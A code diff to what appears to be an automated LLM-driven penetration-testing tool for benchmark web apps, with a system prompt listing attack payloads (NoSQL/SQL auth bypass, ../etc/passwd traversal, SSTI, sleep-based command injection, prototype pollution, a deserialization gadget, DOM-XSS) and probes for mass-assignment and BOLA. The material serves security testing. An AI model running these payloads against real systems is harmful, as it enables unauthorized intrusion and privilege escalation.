@@ -995,8 +995,15 @@ def _exposure_probe(store: ArtifactStore, args) -> None:
         body = str(d.get("content") or "")[:5000]
         low = body.lower()
         pl = path.lower()
+        # A 200 alone is not proof: a catch-all/SPA front-controller returns the app-shell (HTML) for EVERY path,
+        # so /actuator/heapdump on a non-Spring app "exists". Require the body to ACTUALLY be config/secret/dump
+        # content (bob's VERIFY rule) - never the path name alone.
+        is_html = any(t in low for t in ("<html", "<!doctype", "<head", "<body", "<script"))
+        heapdump_ok = "heapdump" in pl and ("java profile" in low or "hprof" in low
+                                            or (not is_html and body.count("\x00") > 3))
+        actuator_json = "actuator" in pl and body.strip().startswith("{") and not is_html
         hit = (_looks_like_secret_file(body)
-               or ("actuator" in pl and (body.strip().startswith("{") or "heapdump" in pl))
+               or actuator_json or heapdump_ok
                or any(k in low for k in ("propertysources", "activeprofiles", "jwt_secret", "db_password",
                                          "secret_key", "aws_secret", "phpinfo()")))
         if hit:
@@ -1022,22 +1029,44 @@ def _nosql_probe(store: ArtifactStore, args) -> None:
            {"email": {"$ne": None}, "password": {"$ne": None}})
 
     def has_tok(b):
-        return bool(bob._JWT_RE.findall(b)) or '"token"' in b.lower() or '"bypassed":true' in b.lower()
+        return bool(bob._JWT_RE.findall(b)) or '"token"' in b.lower() or '"access"' in b.lower() \
+            or '"bypassed":true' in b.lower()
+
+    def authed_as(b):
+        """The username/id the response authenticated as - decode a returned JWT, else read a user field. The
+        bypass signal is OBSERVATION-driven: the operator payload logs us in as a principal we never supplied."""
+        for t in bob._JWT_RE.findall(b or ""):
+            try:
+                p = json.loads(bob._b64url_decode(t.split(".")[1]))
+                v = p.get("username") or p.get("user") or p.get("sub") or p.get("email") or p.get("id")
+                if v is not None:
+                    return str(v).lower()
+            except Exception:  # noqa: BLE001
+                pass
+        m = re.search(r'"(?:username|user|email|name)"\s*:\s*"([^"]{1,64})"', b or "", re.I)
+        return m.group(1).lower() if m else ""
 
     for ep in eps:
-        bst, bbody = bob._rest_post(ep, {"username": "caleb_zzz9", "password": "caleb_yyy9"}, [], args.debug)
-        if int(bst or 0) == 200 and has_tok(bbody):
-            continue                                           # open endpoint -> a $ne "success" would be a false positive
+        # RANDOM bogus username each run: a FIXED one can get registered by prior activity and pollute the
+        # baseline (a token for it would look like an "open endpoint" and suppress a REAL bypass). Only skip when a
+        # random credential is accepted AND authenticates AS that same random user (the endpoint just mints anyone).
+        bogus = "caleb" + "".join(random.choices(string.ascii_lowercase, k=12))
+        bst, bbody = bob._rest_post(ep, {"username": bogus, "password": bogus}, [], args.debug)
+        if int(bst or 0) == 200 and has_tok(bbody) and authed_as(bbody) == bogus:
+            continue
         for payload in ops:
             st, body = bob._rest_post(ep, payload, [], args.debug)
+            who = authed_as(body)
             operr = any(k in body.lower() for k in ("mongoerror", "$where", "bson", "cast to", "unknown operator"))
-            if (int(st or 0) == 200 and has_tok(body)) or operr:
-                store.add_findings([{"severity": "high" if has_tok(body) else "medium",
+            # a real bypass authenticates as a principal we did NOT name (who != the random bogus, non-empty).
+            bypass = int(st or 0) == 200 and has_tok(body) and bool(who) and who != bogus
+            if bypass or operr:
+                store.add_findings([{"severity": "high" if bypass else "medium",
                     "title": f"NoSQL operator injection on {urlparse(ep).path}",
-                    "url": ep, "evidence": ("auth bypass via a Mongo operator ({\"$ne\":null}) returns a token"
-                                            if has_tok(body) else "Mongo-style operator error reflected"),
+                    "url": ep, "evidence": ("auth bypass via a Mongo operator ({\"$ne\":null}) returns a session for "
+                                            "a user never supplied" if bypass else "Mongo-style operator error reflected"),
                     "phase": "P0-unauth"}], "P0")
-                debug_print(f"caleb :: nosql probe HIT {urlparse(ep).path}")
+                debug_print(f"caleb :: nosql probe HIT {urlparse(ep).path} (as '{who or 'err'}')")
                 break
 
 
@@ -1951,8 +1980,14 @@ _SYSTEM = (
     "upload a benign marker module and invoke it. A returned computed value / file content / uid IS the proof.\n"
     "6. REPORT each confirmed issue with `report_finding` (severity/title/url/evidence, secrets REDACTED). A "
     "finding is confirmed by BEHAVIOUR - the endpoint actually returned another user's data / a token / executed "
-    "your benign marker. When every identity is scanned and every chain/lead is dead-ended or proven, reply with "
-    "NO tool call and a one-line 'DONE: <summary>'.\n\n"
+    "your benign marker. REPORT DISCIPLINE - one finding = ONE specific vulnerability on ONE endpoint/param, with "
+    "concrete evidence: the exact URL, the param/header, the payload sent, and the OBSERVED response that proves it "
+    "(the leaked value, the uid output, the other user's record). Do NOT emit vague multi-class summaries ('SQLi/"
+    "NoSQL/SSTI probing across N endpoints', 'multiple hits including XSS, LFI, SSRF') - split them into one concrete "
+    "finding per confirmed bug, or drop them. Do NOT report hedged/unconfirmed claims ('attempt', 'possible', 'RCE-"
+    "like', 'no definitive X yet', 'blocked by WAF') as findings - if BEHAVIOUR didn't prove it, it is not a finding. "
+    "A named vuln class with no observed proof is worth zero. When every identity is scanned and every chain/lead is "
+    "dead-ended or proven, reply with NO tool call and a one-line 'DONE: <summary>'.\n\n"
 
     "PULL EVERY CHAIN TO ITS END - YOU compose the multi-stage path, don't wait for a canned tool. These targets "
     "are deliberately MULTI-STAGE: each foothold HANDS YOU material for the next stage, and the real prize is at "
@@ -1974,20 +2009,123 @@ _SYSTEM = (
     "(RCE / admin / another user's data) is the point. If a `chain(...)` helper doesn't reach it, drive the "
     "remaining hops yourself with http-request.\n\n"
 
-    "You have a LEAN toolset - recon is already done for you (call `state` to see it). To act you have just three "
-    "read/act verbs: `http-request` (your pivot - fetch, POST, replay a token, forge a header, verify a finding; "
-    "set `method` to test ANY verb - GET/POST/PUT/PATCH/DELETE/OPTIONS - a state-changing BOLA often needs PATCH or "
-    "DELETE on ANOTHER user's object, and OPTIONS reveals the allowed verbs), `fuzz` (confirm an injection point), "
-    "`sqlmap` (dump a confirmed SQLi for a chain). Everything else is a caleb capability tool. TEST ALL RELEVANT "
-    "METHODS on an id-bearing resource: a `PATCH /thing/{someone-else's-id}` or `DELETE` that succeeds = "
-    "state-changing BOLA. Be non-destructive: prefer PATCH of a benign field (or DELETE only a resource you "
-    "created); never DoS. Stay on the app's own hosts; redact secret values.")
+    "PROACTIVE OFFENSIVE SWEEP - DRIVE THE RAW VERBS YOURSELF (do NOT lean only on the capability tools). The "
+    "acquire/authed_scan/chain helpers acquire and replay identities; they do NOT test injection, BOLA, "
+    "mass-assignment, traversal or SSTI - and on these benchmark apps that is where most findings live. So YOU "
+    "test them with `http-request`/`fuzz`. FIRST fingerprint the app's class from recon (a JSON/JWT API? a form "
+    "login? a CMS like WordPress? an XML/SOAP service? a file/export feature?) and run the plays that MATCH it - "
+    "do not burn steps forging JWTs on a form-login CMS. Every path/field named below is a STARTING HINT; confirm "
+    "THIS app's real equivalent by observing what it returns:\n"
+    "  - AUTH-BYPASS INJECTION: on each login/auth endpoint, http-request a POST whose credential fields are "
+    "OPERATOR objects, not strings - NoSQL `{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}` (also "
+    "`{\"$gt\":\"\"}`) and SQL `' OR '1'='1'-- `. CONFIRM BY OBSERVATION: a RANDOM bogus string credential is "
+    "REJECTED, yet the operator/SQL payload returns a token/session for a user you did NOT name (usually the first "
+    "account) = auth-bypass injection. (If a random cred ALSO logs in, the endpoint is merely open - not this.)\n"
+    "  - BOLA / IDOR: the instant you can list a collection (a GET returns objects carrying an id/_id), request the "
+    "NEIGHBOURING ids you were NOT given - http-request GET `<resource>/<other-id>` for ids around yours and for "
+    "other users. A 200 returning an object that is NOT yours (a different owner, a `private` record) = BOLA; also "
+    "try PATCH/DELETE on another id for a state-changing BOLA.\n"
+    "  - MASS-ASSIGNMENT -> PRIV-ESC: on register AND on any profile/object update, ADD privileged fields a client "
+    "should not control - `{\"role\":\"admin\",\"isAdmin\":true,\"is_admin\":true,\"verified\":true}` - then RE-READ "
+    "your own record (`/me`-style) or the object; if the injected field STUCK you just escalated. This is often the "
+    "shortest path to admin - try it EARLY.\n"
+    "  - INJECTION IN SEARCH/QUERY SINKS: on an authed search/filter/query endpoint, send operator/injection "
+    "payloads (`{\"$regex\":\"...\"}`/`{\"$where\":\"...\"}` for Mongo, `' UNION SELECT`/`fuzz` for SQL) and read "
+    "whether you extract records you should not, or the `$where`/template value EVALUATES (code injection).\n"
+    "  - TRAVERSAL / LFI: any param or field naming a file/path/template/export/locale/report - set it to "
+    "`../../../../etc/passwd` plus a deep-`../` app-config path; file contents back = traversal, then READ the "
+    "leaked config for secrets/creds and CHAIN.\n"
+    "  - SSTI / RCE SINK: any render/preview/template/translation/report field - submit a benign expression "
+    "(`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`) and look for `49`; a hit is server-side template injection -> "
+    "escalate the marker to code exec.\n"
+    "  - BLIND INJECTION - `sqlmap` IS YOUR ORACLE: a numeric / id / search / filter / token / sort param that does "
+    "NOT reflect and shows NO error is the classic BLIND SQLi (these targets suppress errors ON PURPOSE, so `fuzz` "
+    "often stays silent - silence is NOT 'safe'). Run `sqlmap` on that exact param URL: it is the boolean + "
+    "time-based inference oracle that confirms and extracts what fuzz cannot see; feed it the injectable param "
+    "(`.../?id=1`, a POST body via its options) and read its `Parameter: ... is vulnerable` verdict. NEVER conclude "
+    "'no SQLi' on an id/search/token/filter param until sqlmap has actually run on it. Blind COMMAND injection is "
+    "the same idea - a value concatenated into a shell whose output never returns: infer it with a timing payload "
+    "(`; sleep 5`, `$(sleep 5)`) and watch the response delay.\n"
+    "  - PROTOTYPE POLLUTION & INSECURE DESERIALIZATION (a JSON import / workflow / settings / preferences / merge "
+    "endpoint is the trigger - test it every time): PROTO-POLLUTION - POST `{\"__proto__\":{\"polluted\":\"y\","
+    "\"isAdmin\":true,\"role\":\"admin\"}}` (or a `constructor.prototype` variant), then RE-READ your object / call "
+    "an authz-gated endpoint - if your injected key now appears where it shouldn't or you gained admin, the global "
+    "prototype is polluted. DESERIALIZATION - if an import/upload accepts a serialized blob, send a benign gadget "
+    "for the stack (Node `{\"x\":\"_$$ND_FUNC$$_function(){return 10001}()\"}`, or a Python pickle / PHP `O:` / Java "
+    "gadget) and watch the marker (10001) resolve = object-injection RCE. Benign markers only.\n"
+    "  - BE SYSTEMATIC ON MULTI-ENDPOINT APIs (this is what separates a thorough agent from a shallow one): when "
+    "recon shows MANY endpoints - a big spec, a numbered `/api/.../N` family, a challenge/catalogue/index endpoint "
+    "that LISTS the others - a benchmark plants a DIFFERENT vuln class on EACH endpoint, so the finding you are "
+    "missing is on the endpoint you never tested. If an index/map/list endpoint exists, fetch it FIRST to enumerate "
+    "the full set, then run the FULL battery on EACH endpoint - do NOT assume one vuln class per route and move on: "
+    "on every endpoint try injection (SQLi incl. `sqlmap` for the BLIND/no-error case - especially search / filter / "
+    "tracking / id params), NoSQL operators, an SSTI marker (`{{7*7}}`->49), traversal (`../etc/passwd`), "
+    "mass-assignment, JWT `alg:none`, a trusted-header bypass (`X-Forwarded-For: 127.0.0.1`), AND a debug/error/info "
+    "probe. An endpoint is only 'done' when ALL of these have been tried - the class you skip is the finding you "
+    "miss. Do NOT stop after the first few endpoints; keep going until every endpoint has had the full battery.\n"
+    "  - FIND THE WRITE ENDPOINTS - ALWAYS run `api-map` EARLY, EVERY assessment (do not skip it): the GET-crawl "
+    "misses POST/PUT/PATCH/DELETE-only routes (where mass-assignment, BOLA-write and business-logic live) and HIDDEN "
+    "verbs on a known path - a route the UI only GETs may ALSO accept PATCH/DELETE with no ownership check = a "
+    "state-changing BOLA the frontend never exposed. Run `api-map <base>` WITH your auth header the moment you hold "
+    "an identity (and again unauth) to map which paths answer which verbs; THEN act on every write route it finds - "
+    "mass-assign on a POST/PUT, and try PATCH/DELETE on ANOTHER user's object id on a write route the UI never "
+    "showed. api-map is non-destructive (empty-body probes, never a real DELETE) - the follow-up attack is yours to "
+    "drive. Treat a mapped write verb you have not yet attacked as an OPEN lead - never finish while one remains.\n"
+    "  - ENUMERATE CLEVERLY, NOT BLINDLY: the instant you spot ONE real API route, learn its SHAPE and derive its "
+    "whole family instead of blind-guessing `/api/`. Brute your wordlist UNDER the OBSERVED prefix (if you saw "
+    "`/svc/8a/api/v2/orders`, enumerate `/svc/8a/api/v2/<word>`), PIVOT the version (`/v2/`->`/v1/`,`/v3/` - older "
+    "versions are often weaker), and derive the resource's `/{id}`, its singular/plural, and its sub-resources "
+    "(`/orders/{id}/invoice`, `/orders/{id}/refund`). Feed the routes you already found to `api-map --paths ...` so "
+    "it brute-forces the rest UNDER their real prefixes and reports the verbs. Blind wordlist spraying at `/` is the "
+    "last resort, not the first move.\n"
+    "  - SEE THE PAGE (vision) - for a CLIENT-SIDE vuln or a VISUAL gate the raw HTTP body can't settle, you can SEE "
+    "the rendered page: `screenshot <url>` renders a URL and returns an image you actually see; `browser-actions` "
+    "drives the real browser (goto / describe / fill / click / screenshot / eval). DOM-XSS or client-side template "
+    "injection: a headless HTTP fetch never runs the JS, so put your payload in the URL param the JS sink reads "
+    "(e.g. `?x=<img src=x onerror=alert(1)>` or a hash route with `{{constructor.constructor('...')()}}`), then "
+    "`screenshot` that URL and CONFIRM from the rendered image that it fired (an alert dialog / altered DOM) - that "
+    "is the ONLY way to prove a DOM sink. VISUAL CAPTCHA: `screenshot` the captcha image and READ the code off the "
+    "pixels, then submit it. Use vision only where the body alone can't decide (client-side / visual) - it is slower.\n"
+    "REPORT DISCIPLINE: `report_finding` is for CONFIRMED, POSITIVE vulnerabilities ONLY. NEVER report an absence "
+    "or a negative ('no admin access found', 'no RCE') - it is not a finding and just pollutes the report. And a "
+    "200 from a PUBLIC/STATIC asset (`.js`/`.css`/`.map`/image/font, or anything under `/assets` or `/static`) is "
+    "NOT an access-control finding - those are meant to be public; only a GATED endpoint that returned 401/403 "
+    "WITHOUT your identity and real data WITH it counts.\n\n"
 
-# LEAN tool surface: recon/discovery is done deterministically in P0 (browser-crawl, katana, mining, HTML-links)
-# and handed to the agent via `state` - so the agent needs only the THREE verbs to drive the mission: fetch/POST/
-# replay (http-request), confirm an injection (fuzz), and dump a confirmed SQLi for a chain (sqlmap). Fewer tools =
-# a more focused agent + fewer tokens.
-_OBSERVE_TOOLS = ("http-request", "fuzz", "sqlmap")
+    "Recon is SEEDED for you (call `state` to see it), but you drive further discovery with BATCH tools - NEVER by "
+    "hand-probing a wordlist one URL at a time (that burns your whole step budget AND, on a site that soft-404s "
+    "with a 200 catch-all, drowns you in identical false-positives). DISCOVERY verbs: `path-bust <url>` - file/dir "
+    "discovery; the instant you find a new directory (say `/admin/panel/`) run path-bust ON IT to sweep for `.git/`, "
+    "backups, `.env`, `db.sqlite`/dumps, `phpinfo`, config in ONE call. path-bust CALIBRATES the catch-all and "
+    "reports only structure-DISTINCT real hits, so it cuts through a site that 200s every path - which manual "
+    "http-request probing cannot. `api-map <base>` - the method-aware API/write surface. ACTION verbs: "
+    "`http-request` - your pivot for TARGETED single hits (fetch, POST, replay a token, forge a header, verify a "
+    "finding; set `method` to test ANY verb - GET/POST/PUT/PATCH/DELETE/OPTIONS - a state-changing BOLA often needs "
+    "PATCH or DELETE on ANOTHER user's object, OPTIONS reveals allowed verbs); `fuzz` - sweep a param for an "
+    "injection point (do NOT hand-craft payloads one http-request at a time); `sqlmap` - confirm/dump a classic SQLi; "
+    "`blind-oracle` - when an id/search/filter/token param shows NO error and NO visible change, run it to CONFIRM "
+    "BLIND SQLi or blind OS-command injection (boolean + delay-scaling test, more reliable than one sqlmap pass); "
+    "`vision-verify` - given a reflected/DOM-XSS candidate URL, load it in a real browser to PROVE the payload "
+    "EXECUTES (not just reflects) before you report it. RULE: never loop `http-request` over a candidate-file, path, "
+    "or payload list - that is exactly "
+    "what path-bust / api-map / fuzz / sqlmap are FOR, and they are faster and false-positive-resistant. Everything "
+    "else is a caleb capability tool. TEST ALL RELEVANT METHODS on an id-bearing resource: a "
+    "`PATCH /thing/{someone-else's-id}` or `DELETE` that succeeds = state-changing BOLA. Be non-destructive: prefer "
+    "PATCH of a benign field (or DELETE only a resource you created); never DoS. Stay on the app's own hosts; "
+    "redact secret values.")
+
+# LEAN tool surface: recon/discovery is seeded deterministically in P0 (browser-crawl, katana, path-bust, mining) and
+# handed to the agent via `state`. The agent then drives with BATCH tools - never hand-probing a wordlist one URL at a
+# time (that burns steps AND gets fooled by a soft-404 catch-all that 200s every path): path-bust for file/dir
+# discovery (it calibrates the catch-all and only reports structure-DISTINCT hits), api-map for the method-aware API
+# surface, fuzz to confirm an injection, sqlmap to confirm/dump a blind or classic SQLi. http-request is reserved for
+# TARGETED single hits (a specific endpoint, a chain hop, a replay with an identity) - not for discovery sweeps.
+_OBSERVE_TOOLS = ("http-request", "fuzz", "sqlmap", "path-bust", "api-map", "blind-oracle", "vision-verify",
+                  "screenshot", "browser-actions")
+# vision tools return a rendered PNG that a MULTIMODAL agent (gpt-5 family) actually SEES - the only way to prove a
+# client-side DOM sink (a headless HTTP fetch never runs the JS) or to read a visual captcha off the pixels.
+# vision-verify also returns a proof PNG (of the fired XSS) alongside its executed/reflected verdict.
+_VISION_TOOLS = ("screenshot", "browser-actions", "vision-verify")
 
 
 def _custom_tool_defs() -> list:
@@ -2028,14 +2166,42 @@ def _custom_tool_defs() -> list:
     ]
 
 
-def _dispatch_tool(name, tool_args, store, sm, args) -> str:
-    """Execute one tool call and return a short text result for the LLM (bodies capped, secrets redacted)."""
+def _extract_vision(raw: str):
+    """Pull base64 PNG(s) out of a screenshot / browser-actions result and hand them back as images the multimodal
+    agent SEES, with the huge base64 stripped from the text summary (url/title/visible structure kept). Returns
+    (text, images)."""
+    try:
+        d = json.loads(raw)
+    except Exception:  # noqa: BLE001
+        return _cap(raw), []
+    imgs = []
+
+    def walk(x):
+        if isinstance(x, dict):
+            for k, v in list(x.items()):
+                if k in ("image", "screenshot", "png") and isinstance(v, str) and len(v) > 200:
+                    imgs.append({"media_type": "image/png", "data": v})
+                    x[k] = f"<png {len(v)}b — shown to you as an image below>"
+                else:
+                    walk(v)
+        elif isinstance(x, list):
+            for v in x:
+                walk(v)
+    walk(d)
+    return _cap(json.dumps(d)), imgs[:3]
+
+
+def _dispatch_tool(name, tool_args, store, sm, args):
+    """Execute one tool call and return a short text result for the LLM (bodies capped, secrets redacted). Vision
+    tools return a (text, images) tuple so the agent SEES the rendered page."""
     from ..tools import toolschema
     if name in _OBSERVE_TOOLS:
         argv = toolschema.to_argv(name, tool_args)
         raw = _ccall(argv, [], args.debug)
         # ingest any endpoints/tokens the observation revealed
         _ingest_observation(store, name, argv, raw)
+        if name in _VISION_TOOLS:
+            return _extract_vision(raw)          # (text, images) - the agent SEES the rendered page
         return _cap(raw)
     if name == "caleb_state":
         return _state_summary(store)
@@ -2094,6 +2260,18 @@ def _tool_acquire(store, sm, ta, args) -> str:
     return f"acquire ({m}) failed - try another method or observe the auth surface first"
 
 
+_STATIC_EXT = (".js", ".mjs", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".webp",
+               ".woff", ".woff2", ".ttf", ".eot", ".pdf", ".mp4", ".wasm")
+
+
+def _is_static_asset(u: str) -> bool:
+    """A public static file (a bundle/style/image/font). Reaching one with a token proves NOTHING (they are meant
+    to be public), and a path like /assets/Admin-<hash>.js otherwise trips 'admin' endpoint matchers - so lateral/
+    replay 'reach' findings must skip these. Content-based (path/extension), not target-specific."""
+    p = urlparse(u).path.lower()
+    return p.endswith(_STATIC_EXT) or "/assets/" in p or "/static/" in p or "/_next/static/" in p
+
+
 def _tool_lateral(store, sm, ta, args) -> str:
     """Lateral movement: reuse a held credential/token against other logins / gated endpoints / hosts."""
     hits = 0
@@ -2120,6 +2298,8 @@ def _tool_lateral(store, sm, ta, args) -> str:
     for host in store.hosts:
         base = f"{urlparse(store.base_url).scheme}://{host}"
         for u in store.match_endpoints("admin", "me", "account", "users", "internal", "config"):
+            if _is_static_asset(u):
+                continue                                   # a public bundle/asset is not a gated endpoint
             if (urlparse(u).hostname or "").lower() != host and host not in u:
                 pass
             raw = _ccall(["http-request", u.split("?")[0]], tok_headers or [], args.debug)
@@ -2140,6 +2320,8 @@ def _tool_lateral(store, sm, ta, args) -> str:
             hdr = [scheme % k]
             for host in store.hosts:
                 for u in store.match_endpoints("render", "report", "reports", "admin", "run", "generate", "me", "account", "projects"):
+                    if _is_static_asset(u):
+                        continue                           # a public bundle/asset is not a gated endpoint
                     raw = _ccall(["http-request", u.split("?")[0], "-H", hdr[0]], [], args.debug)
                     d = (_j(raw).get("data") or [{}])[0] or {}
                     st = int(d.get("status") or 0)
@@ -2201,6 +2383,31 @@ def _cap(raw: str, n: int = 6000) -> str:
     return raw if len(raw) <= n else raw[:n] + "\n...[capped]"
 
 
+def _agent_has_surface(store: ArtifactStore) -> bool:
+    """Is there still an attack surface the agent should not walk away from? (endpoints to battery-test, or an
+    unpursued write-endpoint / secret / token lead.)"""
+    if len([e for e in store.endpoints]) >= 3:
+        return True
+    return any(l.get("kind") in ("write-endpoint", "secret", "token", "identity") for l in store.leads)
+
+
+def _agent_nudge(store: ArtifactStore) -> str:
+    """A bounded 'don't stop short' push: the agent tends to declare DONE ~40-50 steps in, before it has run the
+    full battery on every endpoint - the biggest source of missed findings + run-to-run variance. This lists the
+    untested surface and the exact battery to finish."""
+    writes = [l["detail"] for l in store.leads if l.get("kind") == "write-endpoint"][:8]
+    return ("Do NOT conclude yet - the surface is not exhausted. You have "
+            f"{len(store.endpoints)} discovered endpoints"
+            + (f" and UNPURSUED write endpoints (mass-assign a POST/PUT, and PATCH/DELETE another user's id): "
+               f"{writes}" if writes else "")
+            + ". Run the FULL battery on EACH endpoint you have not fully tested - SQLi (incl. `sqlmap` for the "
+            "BLIND/no-error case on search/filter/id/tracking params), NoSQL operators, SSTI `{{7*7}}`->49, "
+            "traversal `../../../../etc/passwd`, mass-assignment, JWT `alg:none`, trusted-header "
+            "`X-Forwarded-For:127.0.0.1`, prototype-pollution/deserialization, and a debug/error/info probe - and "
+            "chase every lead to its END (RCE / another user's data). Only reply DONE once every endpoint has had "
+            "the full battery and every lead is dead-ended.")
+
+
 def _agentic_driver(store: ArtifactStore, sm: SessionManager, args) -> None:
     """The LLM mission loop. Falls through silently if no provider - the deterministic backstop still runs."""
     from ..tools import toolschema
@@ -2226,6 +2433,7 @@ def _agentic_driver(store: ArtifactStore, sm: SessionManager, args) -> None:
             "scan authenticated, chain + lateral-move, report. Begin.")
     messages = [{"role": "user", "content": user}]
     known = set(_OBSERVE_TOOLS) | {t["name"] for t in _custom_tool_defs()}
+    nudges = 0
     for step in range(max(1, args.max_steps)):
         try:
             resp = provider.send(_SYSTEM, messages, tools_spec)
@@ -2238,6 +2446,14 @@ def _agentic_driver(store: ArtifactStore, sm: SessionManager, args) -> None:
             debug_print("caleb> " + " ".join(text.split())[:200])
         if not calls:
             if text.strip():
+                # PERSISTENCE: refuse an early DONE while attack surface remains. The agent tends to conclude
+                # ~40-50 steps in, before the battery is exhausted - the #1 source of missed findings + run-to-run
+                # variance. Bounded to 3 nudges so it always terminates.
+                if nudges < 3 and _agent_has_surface(store):
+                    nudges += 1
+                    debug_print(f"caleb :: persistence nudge {nudges}/3 - {len(store.endpoints)} endpoints remain")
+                    messages.append({"role": "user", "content": _agent_nudge(store)})
+                    continue
                 break
             messages.append({"role": "user", "content": "Use the tools to act - start with caleb_state."})
             continue
@@ -2249,18 +2465,337 @@ def _agentic_driver(store: ArtifactStore, sm: SessionManager, args) -> None:
             targ = c.get("args") or {}
             argpreview = " ".join(f"{k}={str(v)[:40]}" for k, v in targ.items() if k != "header")
             debug_print(f"caleb> step {step}: {c['name']}({argpreview})")
+            imgs = []
             try:
                 out = _dispatch_tool(c["name"], targ, store, sm, args)
+                if isinstance(out, tuple):
+                    out, imgs = out              # vision tool: (text, [images the agent SEES])
             except Exception as exc:  # noqa: BLE001
                 out = f"{c['name']} error: {exc}"
-            debug_print(f"caleb<   -> {str(out).splitlines()[0][:140] if str(out).strip() else '(empty)'}")
-            results.append({"id": c["id"], "output": _cap(str(out))})
+            debug_print(f"caleb<   -> {str(out).splitlines()[0][:140] if str(out).strip() else '(empty)'}"
+                        + (f" [+{len(imgs)} img]" if imgs else ""))
+            r = {"id": c["id"], "output": _cap(str(out))}
+            if imgs:
+                r["images"] = imgs
+            results.append(r)
         messages += provider.tool_results(results)
 
 
 # ==============================================================================================================
 # ORCHESTRATOR + report
 # ==============================================================================================================
+def _mass_assign_probe(store: ArtifactStore, sm: SessionManager, args) -> None:
+    """MASS-ASSIGNMENT (observation-driven, spec-less). Register a CONTROL account (normal fields) and a
+    PRIV-INJECTED one (same + role/isAdmin/is_admin/verified/admin), then read the ROLE each was actually granted -
+    from the returned user object, else the decoded JWT. If the injected account is granted a privileged role the
+    control account was NOT, the register endpoint honours a client-controlled privilege field = mass-assignment
+    privesc. Nothing target-specific: register endpoints are discovered/conventional, and the finding rests on the
+    OBSERVED role difference (not a fixed value). This is the reach a swagger-less JSON app denies the biz-logic
+    backstop, and that a weak model never drives by hand."""
+    scheme = urlparse(store.base_url).scheme
+    root = f"{scheme}://{urlparse(store.base_url).netloc}"
+    reg_eps = [u.split("?")[0] for u in store.match_endpoints("register", "signup", "sign-up")]
+    reg_eps += [f"{root}/{p}" for p in ("api/auth/register", "api/register", "api/signup", "api/users",
+                                        "api/user/register", "auth/register", "register", "signup")]
+    reg_eps = list(dict.fromkeys(reg_eps))[:6]
+    priv = {"role": "admin", "isAdmin": True, "is_admin": True, "verified": True, "admin": True}
+    admin_words = ("admin", "administrator", "superadmin", "root", "owner", "staff")
+
+    def _role_of(body: str, token: str) -> str:
+        m = re.search(r'"role"\s*:\s*"([^"]{1,32})"', body or "", re.I)
+        if m:
+            return m.group(1).lower()
+        if re.search(r'"(?:is_?admin|admin)"\s*:\s*true', body or "", re.I):
+            return "admin"
+        try:
+            p = json.loads(bob._b64url_decode((token or "").split(".")[1]))
+            if str(p.get("role", "")).lower() in admin_words or p.get("is_admin") or p.get("isAdmin") \
+                    or p.get("admin"):
+                return "admin"
+            return str(p.get("role", "user")).lower()
+        except Exception:  # noqa: BLE001
+            return "user"
+
+    for ep in reg_eps:
+        try:
+            cu = "caleb" + "".join(random.choices(string.ascii_lowercase, k=10))
+            cst, cresp = bob._rest_post(ep, {"username": cu, "email": cu + "@example.com",
+                                             "password": "Passw0rd!23", "name": cu}, [], args.debug)
+            if int(cst or 0) not in (200, 201):
+                continue                                       # not a working register endpoint
+            crole = _role_of(cresp, sm._capture_token(cresp))
+            pu = "caleb" + "".join(random.choices(string.ascii_lowercase, k=10))
+            pst, presp = bob._rest_post(ep, {"username": pu, "email": pu + "@example.com",
+                                             "password": "Passw0rd!23", "name": pu, **priv}, [], args.debug)
+            ptok = sm._capture_token(presp)
+            prole = _role_of(presp, ptok)
+            if prole in admin_words and crole not in admin_words:
+                store.add_findings([{"severity": "high",
+                    "title": f"Mass-assignment privilege escalation on {urlparse(ep).path} (register honours client role)",
+                    "url": ep, "evidence": f"injected role field -> role={prole}; a control account (no role field) "
+                    f"-> role={crole}. Client controls its own privilege at registration.",
+                    "phase": "P1"}], "P1")
+                debug_print(f"caleb :: mass-assign HIT {urlparse(ep).path} (priv={prole} vs control={crole})")
+                if ptok:
+                    sm._store("MASS", "admin", sm._bearer(ptok), f"mass-assign@{urlparse(ep).path}", token=ptok)
+                return
+        except Exception as exc:  # noqa: BLE001
+            debug_print(f"caleb :: mass-assign err on {ep}: {exc}")
+
+
+def _bola_walk_observed(store: ArtifactStore, sm: SessionManager, args) -> None:
+    """OBSERVATION-DRIVEN BOLA (spec-less). With an acquired identity, GET each discovered collection-style endpoint
+    (a path returning a JSON ARRAY). Learn MY marker (the username/id in my token) and the ids the app hands back,
+    then request <collection>/<id> for ids I was NOT given (numeric siblings + low ints + ids seen elsewhere). A 200
+    returning an object owned by a DIFFERENT principal (or a `private` record that isn't mine) = BOLA. Uses the
+    app's OWN observed collections+ids and MY observed identity - no swagger spec, no curated noun list, no target
+    literal. This is the id-walk a weak model won't drive and the swagger-only bola backstop can't reach."""
+    # Prefer a GENUINE user session (a real login proves BOLA cleanly; an admin may legitimately see everything,
+    # and a FORGED token is often rejected). Fall back: any real-token session, then anything with headers.
+    def _real(s):
+        return any(k in str(s.get("source", "")).lower() for k in ("register", "login", "unsigned", "debug"))
+    users = [s for s in store.sessions if s.get("headers") and _real(s) and s.get("role") == "user"]
+    reals = [s for s in store.sessions if s.get("headers") and _real(s)]
+    sess = users[0] if users else (reals[0] if reals else
+                                   next((s for s in store.sessions if s.get("headers")), None))
+    if not sess or not sess.get("headers"):
+        return
+    hdr = sess["headers"]
+    my_marker = ""
+    try:
+        p = json.loads(bob._b64url_decode(str(sess.get("_token") or "").split(".")[1]))
+        my_marker = str(p.get("username") or p.get("email") or p.get("sub") or p.get("id") or "").lower()
+    except Exception:  # noqa: BLE001
+        pass
+    id_rx = r'"(?:_id|id)"\s*:\s*"?([A-Za-z0-9][A-Za-z0-9_-]{0,39})'
+    owner_rx = (r'"(?:owner|ownerId|user|userId|user_id|username|account|accountId|createdBy|author|email)"'
+                r'\s*:\s*"?([^",}\s]{1,64})')
+    # collection candidates: discovered GET endpoints WITHOUT a trailing id (a listing), + a small generic fallback
+    cands = []
+    for e in store.endpoints:
+        if e.get("method", "GET").upper() != "GET":
+            continue
+        pth = urlparse(e["url"]).path
+        if re.search(r"/\d+$|/[0-9a-fA-F-]{8,}$", pth):
+            continue                                           # already an item, not a listing
+        cands.append(e["url"].split("?")[0])
+    cands += [f"{urlparse(store.base_url).scheme}://{urlparse(store.base_url).netloc}/{p}"
+              for p in ("api/notes", "api/users", "api/orders", "api/items", "api/documents", "api/files",
+                        "api/messages", "api/records", "api/accounts", "api/invoices")]
